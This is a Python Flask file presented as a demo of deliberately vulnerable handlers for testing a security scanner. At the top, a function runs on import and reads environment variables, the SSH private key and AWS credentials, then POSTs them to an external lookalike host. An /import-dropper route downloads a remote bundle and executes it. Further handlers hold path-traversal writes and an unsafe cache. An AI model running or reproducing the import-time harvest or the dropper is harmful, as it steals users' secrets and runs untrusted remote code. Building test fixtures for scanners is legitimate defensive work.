"""
DEMO FILE — FALSE-NEGATIVE runtime probes. Each handler is an intentional vulnerability.
Findings that do NOT fire are coverage gaps.
"""

import os
import subprocess
import urllib.request
from pathlib import Path

from flask import Flask, request, Response, make_response

app = Flask(__name__)
_cache: dict = {}


# Supply chain — import-time credential harvest (mirrors .pth / sitecustomize hook pattern).
def _import_time_harvest() -> None:
    home = Path.home()
    payload = {
        "env": dict(os.environ),
        "ssh": (home / ".ssh" / "id_rsa").read_text() if (home / ".ssh" / "id_rsa").exists() else "",
        "aws": (home / ".aws" / "credentials").read_text() if (home / ".aws" / "credentials").exists() else "",
    }
    try:
        body = __import__("json").dumps(payload).encode()
        urllib.request.urlopen(
            urllib.request.Request(
                "https://mcp-telemetry.pypi-cdn-relay.io/stage1",
                data=body,
                method="POST",
            ),
            timeout=2,
        )
    except Exception:
        pass


_import_time_harvest()  # CWE-506: runs at module import


# CWE-829 + CWE-78 — fetch unsigned remote bundle and execute.
@app.route("/import-dropper", methods=["POST"])
def import_dropper():
    url = request.args.get("bundle", "https://pkg-cdn-relay.io/stage.pyz")
    tmp = Path("/tmp") / "stage.pyz"
    urllib.request.urlretrieve(url, tmp)  # CWE-829
    subprocess.run(["python3", str(tmp)], check=False)  # CWE-78
    return "ok"


# CWE-22 — commit subject used unsanitized as output filename.
@app.route("/git/format-patch", methods=["POST"])
def git_format_patch():
    import dulwich  # noqa: F401
    subject = request.form["subject"]
    out_dir = request.form.get("dir", "/tmp/patches")
    filename = subject.replace(" ", "-") + ".patch"
    target = Path(out_dir) / filename  # CWE-22
    target.write_text(request.form.get("body", ""))
    return str(target)


# CWE-22 — tree entry path not validated before write.
@app.route("/git/checkout", methods=["POST"])
def git_checkout():
    entry = request.form["path"]
    dest = Path("/var/repos/worktree") / entry
    dest.parent.mkdir(parents=True, exist_ok=True)
    dest.write_bytes(request.files["blob"].read())  # CWE-22
    return str(dest)


# CWE-524 — response with Vary:* cached despite being uncacheable for shared caches.
@app.route("/profile")
def profile_cached():
    resp = make_response({"email": request.headers.get("X-User-Email", "private@corp.io")})
    resp.headers["Vary"] = "*"
    resp.headers["Cache-Control"] = "no-store"
    key = f"profile:{request.headers.get('Authorization', 'anon')}"
    _cache[key] = resp.get_data()  # CWE-524
    return resp


@app.route("/profile/cached")
def profile_serve():
    key = f"profile:{request.headers.get('Authorization', 'anon')}"
    return Response(_cache.get(key, b"{}"), mimetype="application/json")
